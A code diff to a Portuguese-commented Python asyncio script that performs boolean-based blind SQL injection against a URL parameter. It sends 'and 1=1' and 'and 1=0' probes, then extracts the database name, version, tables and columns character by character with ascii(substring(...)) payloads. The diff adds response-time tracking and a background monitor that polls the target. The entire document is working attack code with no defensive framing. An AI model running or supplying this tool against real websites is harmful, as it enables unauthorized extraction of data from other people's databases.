@@ -2,11 +2,12 @@ import aiohttp
 import asyncio
 import requests
 from urllib.parse import urlparse, parse_qs
+import time
 
-# Estruturas para armazenar os resultados
-database_info = {}  # Dicionário para armazenar nome e versão do banco de dados
+
+database_info = {}
 tables = []
-columns = {}  # Dicionário para armazenar colunas por tabela
+columns = {}
 
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
@@ -50,18 +51,43 @@ def detect_parameters(url: str):
 
 async def fetch(session, url):
     """Realiza uma requisição GET assíncrona."""
-    async with session.get(url) as response:
-        return await response.text()
+    start_time = time.time()
+    try:
+        async with session.get(url) as response:
+            html = await response.text()
+            end_time = time.time()
+            response_time = end_time - start_time
+            return html, response_time
+    except Exception as e:
+        print(f"Erro na requisição: {e}")
+        return None, None
+
+async def monitor_connection(session, url: str):
+    """Monitora a estabilidade da conexão."""
+    print("[*] Monitorando a estabilidade da conexão...")
+    response_times = []
+    while True:
+        _, response_time = await fetch(session, url)
+        if response_time is not None:
+            response_times.append(response_time)
+            if len(response_times) > 5:
+                response_times.pop(0)
+            avg_response_time = sum(response_times) / len(response_times)
+            if response_time > avg_response_time * 2: 
+                print("\033[1;33m[!] Atenção: Oscilação na conexão detectada. Testes podem ser prejudicados.\033[0m")
+        await asyncio.sleep(5)  
 
 async def get_true_condition_response(session, url: str):
     """Obtém a resposta quando a condição SQL é verdadeira."""
     true_condition = f"{url} and 1=1 -- -"
-    return await fetch(session, true_condition)
+    html, _ = await fetch(session, true_condition)
+    return html
 
 async def get_false_condition_response(session, url: str):
     """Obtém a resposta quando a condição SQL é falsa."""
     false_condition = f"{url} and 1=0 -- -"
-    return await fetch(session, false_condition)
+    html, _ = await fetch(session, false_condition)
+    return html
 
 async def extract_data(session, url: str, query: str, true_response: str, false_response: str):
     """Extrai dados com base em uma consulta SQL injetada."""
@@ -72,10 +98,10 @@ async def extract_data(session, url: str, query: str, true_response: str, false_
         for j in range(32, 127): 
             montagem = f"{url} and ascii(substring(({query}), {i}, 1)) = {j} -- -"
             try:
-                html = await fetch(session, montagem)
-                if len(html) == len(true_response):
+                html, _ = await fetch(session, montagem)
+                if html is not None and len(html) == len(true_response):
                     result.append(chr(j))
-                    print(f"Caractere encontrado: {''.join(result)}", flush=True, end='\r')
+                    print(f"Extraindo dados: {''.join(result)}", flush=True, end='\r')
                     char_found = True
                     break  
             except Exception as e:
@@ -84,7 +110,8 @@ async def extract_data(session, url: str, query: str, true_response: str, false_
         if not char_found:
             break  
         i += 1  
-    print()  
+    print(" " * (len(f"Extraindo dados: {''.join(result)}") + 10), flush=True, end='\r')  # Limpa a linha
+    print(f"Dado extraído: {''.join(result)}")
     return ''.join(result)
 
 async def extract_database_name(session, url: str, true_response: str, false_response: str):
@@ -140,6 +167,8 @@ async def main():
         return
     
     async with aiohttp.ClientSession() as session:
+        monitor_task = asyncio.create_task(monitor_connection(session, url))
+
         true_response = await get_true_condition_response(session, url)
         false_response = await get_false_condition_response(session, url)
 
@@ -152,7 +181,6 @@ async def main():
         database_version = await extract_database_version(session, url, true_response, false_response)
         database_info["Versão do banco de dados"] = database_version
 
-        
         continuar = input("\nDeseja continuar e extrair as tabelas? (s/n): ").strip().lower()
         if continuar == 's':
             global tables
@@ -171,8 +199,9 @@ async def main():
         else:
             print("Operação encerrada.")
 
-        # Exibe os resultados de forma organizada
         display_results(database_info, tables, columns)
+
+        monitor_task.cancel()
 
 if __name__ == "__main__":
     asyncio.run(main())
